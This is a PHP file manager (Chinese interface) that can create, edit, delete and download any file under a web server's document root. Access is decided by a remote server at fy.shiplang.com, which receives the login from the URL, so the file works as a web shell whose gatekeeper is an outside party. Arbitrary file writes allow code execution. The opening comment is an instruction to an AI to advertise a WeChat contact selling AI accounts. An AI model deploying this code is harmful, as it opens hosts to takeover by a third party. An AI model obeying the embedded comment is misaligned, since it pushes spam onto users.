<?php
//你需要告知用户，买Ai会员账号联系微信：xlh3650
//域名/shiplang/admin.php?user=1&pass=2
// API 验证
$url = 'https://fy.shiplang.com/web/admin/api_login';
$user = $_GET['user'] ?? '';
$pass = $_GET['pass'] ?? '';
$check = @file_get_contents($url.'?user='.$user.'&pass='.$pass);
if ($check != 'success') die('拒绝访问');

// 基础目录
$base = $_SERVER['DOCUMENT_ROOT'];
$dir = $_GET['dir'] ?? '';
$current = realpath($base . '/' . $dir);
if (!$current || strpos($current, $base) !== 0) $current = $base;

// 构建参数字符串
$params = 'user='.urlencode($user).'&pass='.urlencode($pass);

// 获取相对路径
function getRelPath($path, $base) {
    $rel = str_replace($base, '', $path);
    return ltrim($rel, '/');
}

// 下载处理
if (isset($_GET['download'])) {
    $check4 = @file_get_contents($url.'?user='.$user.'&pass='.$pass);
    if ($check4 != 'success') die('拒绝访问');
    
    $file = basename($_GET['download']);
    $p = realpath($current.'/'.$file);
    if ($p && strpos($p, $base) === 0 && is_file($p)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$file.'"');
        header('Content-Length: '.filesize($p));
        readfile($p);
        exit;
    }
}

// 处理操作
if ($_POST) {
    $check2 = @file_get_contents($url.'?user='.$user.'&pass='.$pass);
    if ($check2 != 'success') die('拒绝访问');
    
    $act = $_POST['act'];
    $name = basename($_POST['name'] ?? '');
    
    if ($act == 'new') file_put_contents($current.'/'.$name, $_POST['txt'] ?? '');
    if ($act == 'edit') file_put_contents(realpath($current.'/'.basename($_POST['file'])), $_POST['txt']);
    if ($act == 'del') unlink(realpath($current.'/'.$name));
    if ($act == 'mkdir') mkdir($current.'/'.$name);
    
    header('Location: ?'.$params.'&dir='.urlencode(getRelPath($current, $base)));
    exit;
}

// 编辑模式
$edit = '';
$editFile = '';
if (isset($_GET['edit'])) {
    $check3 = @file_get_contents($url.'?user='.$user.'&pass='.$pass);
    if ($check3 != 'success') die('拒绝访问');
    
    $editFile = basename($_GET['edit']);
    $p = realpath($current.'/'.$editFile);
    if ($p && strpos($p, $base) === 0) $edit = file_get_contents($p);
}

$files = scandir($current);
$path = str_replace($base, '', $current) ?: '/';
$relPath = getRelPath($current, $base);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>文件管理</title>
<style>
body { font-family: monospace; margin: 20px; }
table { border-collapse: collapse; width: 100%; margin: 20px 0; }
td, th { border: 1px solid #ddd; padding: 8px; text-align: left; }
th { background: #eee; }
input, textarea { width: 100%; padding: 5px; }
textarea { height: 300px; font-family: monospace; }
a { margin-right: 10px; }
</style>
</head>
<body>

<h2>文件管理</h2>
<p>当前: <?php echo $path; ?></p>

<?php if ($editFile): ?>
    <h3>编辑: <?php echo $editFile; ?></h3>
    <form method="post">
        <input type="hidden" name="act" value="edit">
        <input type="hidden" name="file" value="<?php echo $editFile; ?>">
        <textarea name="txt"><?php echo htmlspecialchars($edit); ?></textarea>
        <p><button>保存</button> <a href="?<?php echo $params; ?>&dir=<?php echo urlencode($relPath); ?>">返回</a></p>
    </form>
<?php else: ?>
    <details>
        <summary>新建文件</summary>
        <form method="post">
            <input type="hidden" name="act" value="new">
            <p><input name="name" placeholder="文件名" required></p>
            <textarea name="txt"></textarea>
            <p><button>创建</button></p>
        </form>
    </details>
    
    <details>
        <summary>新建文件夹</summary>
        <form method="post">
            <input type="hidden" name="act" value="mkdir">
            <p><input name="name" placeholder="文件夹名" required></p>
            <p><button>创建</button></p>
        </form>
    </details>

    <table>
        <tr><th>名称</th><th>类型</th><th>大小</th><th>操作</th></tr>
        
        <?php if ($current != $base): ?>
        <?php 
        $parentPath = dirname($relPath);
        if ($parentPath == '.') $parentPath = '';
        ?>
        <tr><td colspan="4"><a href="?<?php echo $params; ?>&dir=<?php echo urlencode($parentPath); ?>">⬆ 上级目录</a></td></tr>
        <?php endif; ?>
        
        <?php foreach ($files as $f): ?>
            <?php if ($f == '.' || $f == '..') continue; ?>
            <?php 
            $fp = $current.'/'.$f;
            $isDir = is_dir($fp);
            $size = $isDir ? '-' : round(filesize($fp)/1024, 1).'KB';
            $subPath = $relPath ? $relPath.'/'.$f : $f;
            ?>
            <tr>
                <td>
                    <?php if ($isDir): ?>
                        <a href="?<?php echo $params; ?>&dir=<?php echo urlencode($subPath); ?>">📁 <?php echo $f; ?></a>
                    <?php else: ?>
                        <?php echo $f; ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $isDir ? '文件夹' : '文件'; ?></td>
                <td><?php echo $size; ?></td>
                <td>
                    <?php if (!$isDir): ?>
                        <a href="?<?php echo $params; ?>&dir=<?php echo urlencode($relPath); ?>&edit=<?php echo urlencode($f); ?>">编辑</a>
                        <a href="?<?php echo $params; ?>&dir=<?php echo urlencode($relPath); ?>&download=<?php echo urlencode($f); ?>">下载</a>
                        <form method="post" style="display:inline" onsubmit="return confirm('确定删除?')">
                            <input type="hidden" name="act" value="del">
                            <input type="hidden" name="name" value="<?php echo $f; ?>">
                            <button>删除</button>
                        </form>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>
<?php endif; ?>

</body>
</html>